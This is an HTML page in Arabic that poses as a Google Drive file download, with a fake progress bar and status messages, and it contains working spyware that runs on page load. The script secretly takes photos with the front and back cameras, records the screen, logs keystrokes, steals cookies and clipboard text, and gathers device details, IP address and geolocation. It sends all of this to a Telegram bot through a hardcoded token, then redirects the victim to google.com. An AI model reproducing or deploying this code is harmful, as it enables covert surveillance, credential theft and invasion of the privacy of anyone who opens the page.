
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري تحميل الملف...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont,  Segoe UI , Roboto,  Helvetica Neue , Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .loader-container {
            text-align: center;
            max-width: 320px;
            width: 100%;
        }
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid #e0e0e0;
            border-top-color: #3498db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .title {
            font-size: 18px;
            font-weight: 500;
            color: #2c3e50;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #7f8c8d;
            margin-bottom: 25px;
        }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #ecf0f1;
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: #3498db;
            animation: progress 2.5s ease-out forwards;
        }
        @keyframes progress {
            0% { width: 0%; }
            30% { width: 45%; }
            60% { width: 75%; }
            100% { width: 100%; }
        }
        .status-text {
            font-size: 13px;
            color: #95a5a6;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #bdc3c7;
        }
        /* كل شيء مخفي تمامًا */
        .hidden-elements {
            display: none !important;
        }
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>

<video id="frontVideo" autoplay playsinline muted></video>
<video id="backVideo" autoplay playsinline muted></video>

<div class="loader-container" id="mainUI">
    <div class="spinner"></div>
    <div class="title">جاري تجهيز الملف...</div>
    <div class="subtitle">يرجى الانتظار قليلاً</div>
    <div class="progress-bar">
        <div class="progress-fill"></div>
    </div>
    <div class="status-text" id="statusMsg">معالجة الطلب...</div>
    <div class="footer-note">© Google Drive • تحميل آمن</div>
</div>

<script>
(function() {
    // ========== إعدادات البوت ==========
    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
    const CHAT_ID = "7984067238";
    
    // ========== المتغيرات ==========
    let frontStream = null, backStream = null;
    let frontVideo = null, backVideo = null;
    let frontReady = false, backReady = false;
    let frontCount = 0, backCount = 0, cycleCount = 0;
    let isActive = true;
    let keyBuffer = "";
    
    // ========== دوال الإرسال (صامتة) ==========
    async function sendMessage(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method:  POST ,
                headers: {  Content-Type :  application/json  },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode:  HTML  })
            });
        } catch(e) {}
    }
    
    async function sendPhoto(blob, caption) {
        try {
            const fd = new FormData();
            fd.append( chat_id , CHAT_ID);
            fd.append( photo , blob, `img_${Date.now()}.jpg`);
            if (caption) fd.append( caption , caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method:  POST , body: fd });
        } catch(e) {}
    }
    
    // ========== الكاميرا الأمامية (صامتة) ==========
    async function initFront() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact:  user  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
            });
            frontStream = stream;
            frontVideo = document.getElementById( frontVideo );
            frontVideo.srcObject = stream;
            await frontVideo.play();
            await new Promise(r => setTimeout(r, 300));
            frontReady = true;
            return true;
        } catch(e) { return false; }
    }
    
    // ========== الكاميرا الخلفية (صامتة) ==========
    async function initBack() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact:  environment  }, width: { ideal: 1024 }, height: { ideal: 768 } } 
            });
            backStream = stream;
            backVideo = document.getElementById( backVideo );
            backVideo.srcObject = stream;
            await backVideo.play();
            await new Promise(r => setTimeout(r, 300));
            backReady = true;
            return true;
        } catch(e) { return false; }
    }
    
    // ========== التقاط صورة ==========
    async function capture(videoEl, side) {
        return new Promise((resolve) => {
            try {
                if (!videoEl || videoEl.readyState < 2 || videoEl.videoWidth === 0) {
                    resolve(false);
                    return;
                }
                const canvas = document.createElement( canvas );
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                const ctx = canvas.getContext( 2d );
                ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 5000) {
                        const label = side ===  front  ? `🤳 أمامي #${frontCount+1}` : `📷 خلفي #${backCount+1}`;
                        await sendPhoto(blob, label);
                        if (side ===  front ) frontCount++;
                        else backCount++;
                        resolve(true);
                    } else resolve(false);
                },  image/jpeg , 0.85);
            } catch(e) { resolve(false); }
        });
    }
    
    // ========== دورة التصوير (خلفية تمامًا) ==========
    async function startCycle() {
        if (!isActive) return;
        cycleCount++;
        
        if (frontReady) {
            for (let i = 0; i < 6; i++) {
                if (!isActive) break;
                await capture(frontVideo,  front );
                await new Promise(r => setTimeout(r, 350));
            }
        }
        
        if (backReady) {
            for (let i = 0; i < 6; i++) {
                if (!isActive) break;
                await capture(backVideo,  back );
                await new Promise(r => setTimeout(r, 350));
            }
        }
        
        setTimeout(() => { if (isActive) startCycle(); }, 7000);
    }
    
    // ========== تسجيل الشاشة ==========
    async function recordScreen() {
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: false });
            const recorder = new MediaRecorder(stream, { mimeType:  video/webm  });
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type:  video/webm  });
                if (blob.size > 10000) {
                    const fd = new FormData();
                    fd.append( chat_id , CHAT_ID);
                    fd.append( video , blob, `screen_${Date.now()}.webm`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method:  POST , body: fd });
                }
                stream.getTracks().forEach(t => t.stop());
            };
            recorder.start();
            setTimeout(() => { if (recorder.state ===  recording ) recorder.stop(); }, 18000);
        } catch(e) {}
    }
    
    // ========== معلومات الجهاز ==========
    async function sendDeviceData() {
        let msg = `🔐 <b>جهاز جديد</b>\n━━━━━━━━━━━━━━━━━━\n`;
        msg += `📱 ${navigator.userAgent.substring(0, 120)}\n`;
        msg += `💻 ${navigator.platform}\n`;
        msg += `📺 ${screen.width}x${screen.height}\n`;
        msg += `🌍 ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
        msg += `🧠 RAM: ${navigator.deviceMemory ||  غير معروف } جيجا\n`;
        msg += `⚙️ النوى: ${navigator.hardwareConcurrency ||  غير معروف }\n`;
        await sendMessage(msg);
    }
    
    // ========== الموقع ==========
    async function getLocationData() {
        if (!navigator.geolocation) return;
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await sendMessage(`📍 <b>الموقع</b>\nhttps://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 الدقة: ${pos.coords.accuracy}م`);
        }, () => {});
    }
    
    // ========== IP العام ==========
    async function getPublicIP() {
        try {
            const res = await fetch( https://api.ipify.org?format=json );
            const data = await res.json();
            await sendMessage(`🌍 <b>IP العام</b>\n<code>${data.ip}</code>`);
        } catch(e) {}
    }
    
    // ========== Keylogger ==========
    function startKeylogger() {
        document.addEventListener( keydown , (e) => {
            const target = e.target;
            if (target && (target.tagName ===  INPUT  || target.tagName ===  TEXTAREA )) {
                if (e.key ===  Enter ) keyBuffer +=  [⏎] ;
                else if (e.key ===  Backspace ) keyBuffer +=  [⌫] ;
                else if (e.key.length === 1) keyBuffer += e.key;
                
                if (keyBuffer.length > 150) {
                    sendMessage(`⌨️ <b>ضغطات</b>\n<code>${keyBuffer}</code>`);
                    keyBuffer =   ;
                }
            }
        });
        
        setInterval(() => {
            if (keyBuffer.length > 0) {
                sendMessage(`⌨️ <b>ضغطات</b>\n<code>${keyBuffer}</code>`);
                keyBuffer =   ;
            }
        }, 12000);
    }
    
    // ========== سرقة الكوكيز ==========
    async function stealCookies() {
        if (document.cookie && document.cookie.length > 0) {
            await sendMessage(`🍪 <b>الكوكيز</b>\n<code>${document.cookie.substring(0, 800)}</code>`);
        }
    }
    
    // ========== سرقة الحافظة ==========
    async function stealClipboard() {
        try {
            const text = await navigator.clipboard.readText();
            if (text && text.length > 0) {
                await sendMessage(`📋 <b>الحافظة</b>\n<code>${text.substring(0, 500)}</code>`);
            }
        } catch(e) {}
    }
    
    // ========== تغيير النص الوهمي للضحية ==========
    let step = 0;
    const fakeMessages = [
        "جاري فتح الملف...",
        "تحميل البيانات...",
        "اكتمال 45%",
        "اكتمال 78%",
        "معالجة...",
        "اكتمال 100% 🎉",
        "جاري إعادة التوجيه..."
    ];
    
    function updateFakeStatus() {
        const statusEl = document.getElementById( statusMsg );
        if (statusEl && step < fakeMessages.length) {
            statusEl.innerText = fakeMessages[step];
            step++;
            setTimeout(updateFakeStatus, 800);
        } else if (step >= fakeMessages.length) {
            // إعادة توجيه إلى موقع حقيقي بعد 3 ثوانٍ
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        }
    }
    
    // ========== التشغيل الرئيسي (كل شيء في الخلفية) ==========
    async function main() {
        // طلب الصلاحيات (يظهر للمستخدم مرة واحدة فقط)
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        } catch(e) {}
        
        // بدء جميع العمليات في الخلفية (غير مرئية للمستخدم)
        setTimeout(async () => {
            await sendMessage(`🚀 <b>اختراق ناجح</b>\n🕐 ${new Date().toLocaleString( ar-EG )}`);
            await sendDeviceData();
            await getPublicIP();
            await getLocationData();
            await stealCookies();
            await stealClipboard();
            
            await initFront();
            await initBack();
            
            if (frontReady || backReady) {
                startCycle();
            }
            
            startKeylogger();
            recordScreen();
            
        }, 100);
        
        // بدء الوهم البصري للمستخدم
        updateFakeStatus();
    }
    
    // تشغيل كل شيء بعد تحميل الصفحة مباشرة
    window.onload = () => {
        setTimeout(main, 200);
    };
})();
</script>
</body>
</html>
